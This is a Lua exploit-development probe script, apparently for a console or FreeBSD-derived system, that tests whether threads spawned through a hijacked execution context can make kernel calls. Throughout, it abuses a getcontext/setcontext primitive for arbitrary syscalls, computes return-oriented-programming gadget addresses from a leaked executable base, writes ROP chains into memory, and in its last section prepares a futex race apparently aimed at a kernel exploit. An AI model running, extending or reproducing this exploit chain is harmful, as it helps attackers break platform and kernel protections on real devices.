-- CRASH_CLASS: LOW
-- PROBE 142m: Thread side-effect test — confirm child thread I/O
--
-- 142l[D] CONFIRMED: thr_create uses MC=0x40 format (same as getcontext).
-- Pure getcontext + override RIP(+0xE0)/RSP(+0xF8) → rv=0, ALIVE thread!
--
-- This probe confirms the thread executes syscalls with side effects:
-- [A] LOCK_PI on unowned futex: kernel writes child TID to futex word
-- [B] mmap: child does mmap, main checks sys624 delta (+5 per mmap)
-- [C] Write test: child writes marker via sysctl/write to GPU memory

print("=== PROBE 142m: THREAD SIDEEFFECT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP helper
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

-- Main TID
local tid_main_buf = gpu + 0x100
wq(tid_main_buf, uint64(0))
srop(432, ua(tid_main_buf))
local main_tid = to_num(safe_rd(tid_main_buf))
print("main_TID=" .. main_tid)

-- Helper: create thread with ROP chain (MC=0x40 format, nanosleep-based)
local function make_thread(rop_addr, label)
    local ctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + 0xE0, g_ret)
    wq(ctx + 0xF8, rop_addr)

    local tid_buf = memory.alloc(8)
    wq(tid_buf, uint64(0xDEADDEAD))

    print("[" .. label .. "] Creating thread...")
    local ok, rv = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    local ntid = safe_rq(tid_buf)
    local nh, nl = get_hi_lo(ntid)
    print("[" .. label .. "] ok=" .. tostring(ok) .. " rv=" .. tostring(rv) .. " tid=" .. nl)
    return nl, rv
end

-- Timespecs on GPU
local tspec_short = gpu + 0x200   -- 200ms
wq(tspec_short, uint64(0))
wq(tspec_short + 8, uint64(200000000))

local tspec_long = gpu + 0x210   -- 30s
wq(tspec_long, uint64(30))
wq(tspec_long + 8, uint64(0))

--------------------------------------------------------------------
-- [A] LOCK_PI side-effect: child acquires unowned futex
-- Kernel writes child TID to futex word. Main reads it.
--------------------------------------------------------------------
print("")
print("--- [A] LOCK_PI side-effect ---")

local futex_a = gpu + 0x1000
wd(futex_a, 0)
print("[A] futex_before=0x" .. string.format("%X", safe_rd(futex_a) or 0))

local stack_a = gpu + 0x10000
for off = 0, 0x7FFF, 4 do wd(stack_a + off, 0) end

-- ROP: short sleep → LOCK_PI → long sleep
local rop_a = stack_a + 0x7000
local i = 0
-- 1. Short nanosleep (200ms) to let main thread start polling
wq(rop_a + i, g_pop_rdi); i = i + 8
wq(rop_a + i, ua(tspec_short)); i = i + 8
wq(rop_a + i, g_pop_rsi); i = i + 8
wq(rop_a + i, uint64(0)); i = i + 8
wq(rop_a + i, g_pop_rax); i = i + 8
wq(rop_a + i, uint64(240)); i = i + 8
wq(rop_a + i, sc_addr); i = i + 8
-- sc_addr+2 = ret → continues ROP

-- 2. LOCK_PI on unowned futex → writes child TID to futex
wq(rop_a + i, g_pop_rdi); i = i + 8
wq(rop_a + i, ua(futex_a)); i = i + 8
wq(rop_a + i, g_pop_rsi); i = i + 8
wq(rop_a + i, uint64(12)); i = i + 8  -- UMTX_OP_LOCK_PI
wq(rop_a + i, g_pop_rax); i = i + 8
wq(rop_a + i, uint64(454)); i = i + 8
wq(rop_a + i, sc_addr); i = i + 8

-- 3. Long nanosleep (keep alive for observation)
wq(rop_a + i, g_pop_rdi); i = i + 8
wq(rop_a + i, ua(tspec_long)); i = i + 8
wq(rop_a + i, g_pop_rsi); i = i + 8
wq(rop_a + i, uint64(0)); i = i + 8
wq(rop_a + i, g_pop_rax); i = i + 8
wq(rop_a + i, uint64(240)); i = i + 8
wq(rop_a + i, sc_addr); i = i + 8

local tid_a, rv_a = make_thread(ua(rop_a), "A")

-- Wait 500ms for short sleep + LOCK_PI to complete
local ts_wait = memory.alloc(16)
wq(ts_wait, uint64(0)); wq(ts_wait + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

print("[A] alive pid=" .. to_num(sc20()))
local fva = safe_rd(futex_a)
print("[A] futex_after=0x" .. string.format("%X", fva or 0))

if fva and fva ~= 0 then
    print("[A] *** FUTEX CHANGED! value=0x" .. string.format("%X", fva) .. " ***")
    local child_tid = fva % 0x80000000  -- mask off contested bit
    print("[A] *** CHILD TID IN FUTEX = " .. child_tid .. " ***")
    if child_tid == tid_a then
        print("[A] *** MATCHES ALLOCATED TID! ***")
    end
    print("[A] *** THREAD SIDE-EFFECT CONFIRMED! ***")
end

-- Verify thread alive
if tid_a ~= 0 and tid_a ~= 0xDEADDEAD then
    local rv_k = srop(433, uint64(tid_a), uint64(0))
    local kh, kl = get_hi_lo(rv_k)
    print("[A] thr_kill=" .. hex(rv_k) .. " " .. ((kl == 0 and kh == 0) and "ALIVE" or "dead"))
end

--------------------------------------------------------------------
-- [B] sys624 delta: child does mmap → main checks counter
-- sys624 increments by +5 per mmap. If child mmaps, delta = +5.
--------------------------------------------------------------------
print("")
print("--- [B] sys624 mmap delta ---")

local s_before = srop(624)
local sbh, sbl = get_hi_lo(s_before)
print("[B] sys624_before=" .. sbl)

local stack_b = gpu + 0x20000
for off = 0, 0x7FFF, 4 do wd(stack_b + off, 0) end

-- ROP: short sleep → mmap → long sleep
local rop_b = stack_b + 0x7000
i = 0
-- Short sleep
wq(rop_b + i, g_pop_rdi); i = i + 8
wq(rop_b + i, ua(tspec_short)); i = i + 8
wq(rop_b + i, g_pop_rsi); i = i + 8
wq(rop_b + i, uint64(0)); i = i + 8
wq(rop_b + i, g_pop_rax); i = i + 8
wq(rop_b + i, uint64(240)); i = i + 8
wq(rop_b + i, sc_addr); i = i + 8

-- mmap(0, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)
-- args: rdi=0, rsi=0x4000, rdx=3, r10=0x1002, r8=-1, r9=0
-- We can only control rdi, rsi, rax via ROP. rdx/r10/r8/r9 from getcontext.
-- This might fail due to wrong rdx/r10/r8 values.
-- But let's try: even if mmap fails, the syscall entry counts in sys624.
wq(rop_b + i, g_pop_rdi); i = i + 8
wq(rop_b + i, uint64(0)); i = i + 8
wq(rop_b + i, g_pop_rsi); i = i + 8
wq(rop_b + i, uint64(0x4000)); i = i + 8
wq(rop_b + i, g_pop_rax); i = i + 8
wq(rop_b + i, uint64(477)); i = i + 8  -- mmap
wq(rop_b + i, sc_addr); i = i + 8

-- Long sleep
wq(rop_b + i, g_pop_rdi); i = i + 8
wq(rop_b + i, ua(tspec_long)); i = i + 8
wq(rop_b + i, g_pop_rsi); i = i + 8
wq(rop_b + i, uint64(0)); i = i + 8
wq(rop_b + i, g_pop_rax); i = i + 8
wq(rop_b + i, uint64(240)); i = i + 8
wq(rop_b + i, sc_addr); i = i + 8

local tid_b, rv_b = make_thread(ua(rop_b), "B")

pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

local s_after = srop(624)
local sah, sal = get_hi_lo(s_after)
print("[B] sys624_after=" .. sal .. " delta=" .. (sal - sbl))
if (sal - sbl) >= 5 then
    print("[B] *** sys624 delta >= 5! CHILD MMAP WORKED! ***")
elseif (sal - sbl) > 0 then
    print("[B] *** sys624 delta > 0: CHILD ENTERED KERNEL! ***")
end

if tid_b ~= 0 and tid_b ~= 0xDEADDEAD then
    local rv_k = srop(433, uint64(tid_b), uint64(0))
    local kh, kl = get_hi_lo(rv_k)
    print("[B] thr_kill=" .. hex(rv_k) .. " " .. ((kl == 0 and kh == 0) and "ALIVE" or "dead"))
end

--------------------------------------------------------------------
-- [C] Multiple threads: create 3 threads simultaneously
-- Each with different nanosleep durations. Check all alive.
--------------------------------------------------------------------
print("")
print("--- [C] Multiple threads ---")

local tids = {}
for t = 1, 3 do
    local tspec_t = gpu + 0x300 + t * 16
    wq(tspec_t, uint64(20 + t * 5))  -- 25s, 30s, 35s
    wq(tspec_t + 8, uint64(0))

    local stack_t = gpu + 0x30000 + t * 0x10000
    for off = 0, 0x7FFF, 4 do wd(stack_t + off, 0) end
    local rop_t = stack_t + 0x7000
    wq(rop_t + 0x00, g_pop_rdi)
    wq(rop_t + 0x08, ua(tspec_t))
    wq(rop_t + 0x10, g_pop_rsi)
    wq(rop_t + 0x18, uint64(0))
    wq(rop_t + 0x20, g_pop_rax)
    wq(rop_t + 0x28, uint64(240))
    wq(rop_t + 0x30, sc_addr)
    wq(rop_t + 0x38, g_pop_rdi)
    wq(rop_t + 0x40, ua(tspec_t))
    wq(rop_t + 0x48, g_pop_rsi)
    wq(rop_t + 0x50, uint64(0))
    wq(rop_t + 0x58, g_pop_rax)
    wq(rop_t + 0x60, uint64(240))
    wq(rop_t + 0x68, sc_addr)

    local tid_t, rv_t = make_thread(ua(rop_t), "C" .. t)
    tids[t] = tid_t
end

pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

local alive_count = 0
for t = 1, 3 do
    if tids[t] and tids[t] ~= 0 and tids[t] ~= 0xDEADDEAD then
        local rv_k = srop(433, uint64(tids[t]), uint64(0))
        local kh, kl = get_hi_lo(rv_k)
        local tag = (kl == 0 and kh == 0) and "ALIVE" or "dead"
        print("[C] thread" .. t .. " tid=" .. tids[t] .. " thr_kill=" .. tag)
        if kl == 0 and kh == 0 then alive_count = alive_count + 1 end
    end
end
print("[C] alive_count=" .. alive_count .. "/3")
if alive_count == 3 then
    print("[C] *** ALL 3 THREADS ALIVE! MULTI-THREADING WORKS! ***")
end

--------------------------------------------------------------------
-- [D] UMTX race prep: two threads doing LOCK_PI on same futex
-- One acquires, other should block with contested bit.
--------------------------------------------------------------------
print("")
print("--- [D] UMTX contention test ---")

local futex_d = gpu + 0x2000
wd(futex_d, 0)
print("[D] futex_before=0x" .. string.format("%X", safe_rd(futex_d) or 0))

-- Thread D1: LOCK_PI → long nanosleep (holds the lock)
local stack_d1 = gpu + 0x70000
for off = 0, 0x7FFF, 4 do wd(stack_d1 + off, 0) end
local rop_d1 = stack_d1 + 0x7000
i = 0
wq(rop_d1 + i, g_pop_rdi); i = i + 8
wq(rop_d1 + i, ua(futex_d)); i = i + 8
wq(rop_d1 + i, g_pop_rsi); i = i + 8
wq(rop_d1 + i, uint64(12)); i = i + 8
wq(rop_d1 + i, g_pop_rax); i = i + 8
wq(rop_d1 + i, uint64(454)); i = i + 8
wq(rop_d1 + i, sc_addr); i = i + 8
wq(rop_d1 + i, g_pop_rdi); i = i + 8
wq(rop_d1 + i, ua(tspec_long)); i = i + 8
wq(rop_d1 + i, g_pop_rsi); i = i + 8
wq(rop_d1 + i, uint64(0)); i = i + 8
wq(rop_d1 + i, g_pop_rax); i = i + 8
wq(rop_d1 + i, uint64(240)); i = i + 8
wq(rop_d1 + i, sc_addr); i = i + 8

local tid_d1, rv_d1 = make_thread(ua(rop_d1), "D1")

-- Wait 500ms for D1 to acquire lock
pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

local fvd_mid = safe_rd(futex_d)
print("[D] futex_after_D1=0x" .. string.format("%X", fvd_mid or 0))
if fvd_mid and fvd_mid ~= 0 then
    print("[D] *** D1 ACQUIRED LOCK! TID=" .. (fvd_mid % 0x80000000) .. " ***")
end

-- Thread D2: LOCK_PI on same futex → should BLOCK (contested)
local stack_d2 = gpu + 0x80000
for off = 0, 0x7FFF, 4 do wd(stack_d2 + off, 0) end
local rop_d2 = stack_d2 + 0x7000
i = 0
wq(rop_d2 + i, g_pop_rdi); i = i + 8
wq(rop_d2 + i, ua(futex_d)); i = i + 8
wq(rop_d2 + i, g_pop_rsi); i = i + 8
wq(rop_d2 + i, uint64(12)); i = i + 8
wq(rop_d2 + i, g_pop_rax); i = i + 8
wq(rop_d2 + i, uint64(454)); i = i + 8
wq(rop_d2 + i, sc_addr); i = i + 8
wq(rop_d2 + i, g_pop_rdi); i = i + 8
wq(rop_d2 + i, ua(tspec_long)); i = i + 8
wq(rop_d2 + i, g_pop_rsi); i = i + 8
wq(rop_d2 + i, uint64(0)); i = i + 8
wq(rop_d2 + i, g_pop_rax); i = i + 8
wq(rop_d2 + i, uint64(240)); i = i + 8
wq(rop_d2 + i, sc_addr); i = i + 8

local tid_d2, rv_d2 = make_thread(ua(rop_d2), "D2")

pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

local fvd_final = safe_rd(futex_d)
print("[D] futex_after_D2=0x" .. string.format("%X", fvd_final or 0))
if fvd_final and fvd_final >= 0x80000000 then
    print("[D] *** CONTESTED BIT SET! D2 IS BLOCKED IN LOCK_PI! ***")
    print("[D] *** KERNEL FUTEX CONTENTION WORKS WITH THREADS! ***")
end

-- Check both threads alive
if tid_d1 ~= 0 and tid_d1 ~= 0xDEADDEAD then
    local rv_k1 = srop(433, uint64(tid_d1), uint64(0))
    local k1h, k1l = get_hi_lo(rv_k1)
    print("[D] D1 thr_kill=" .. ((k1l == 0 and k1h == 0) and "ALIVE" or "dead"))
end
if tid_d2 ~= 0 and tid_d2 ~= 0xDEADDEAD then
    local rv_k2 = srop(433, uint64(tid_d2), uint64(0))
    local k2h, k2l = get_hi_lo(rv_k2)
    print("[D] D2 thr_kill=" .. ((k2l == 0 and k2h == 0) and "ALIVE" or "dead"))
end

print("")
print("=== RESULTS ===")
print("pid=" .. pid)
print("threading: MC=0x40 format CONFIRMED")
print("thr_create rv=0 with correct format")
print("=== DONE ===")
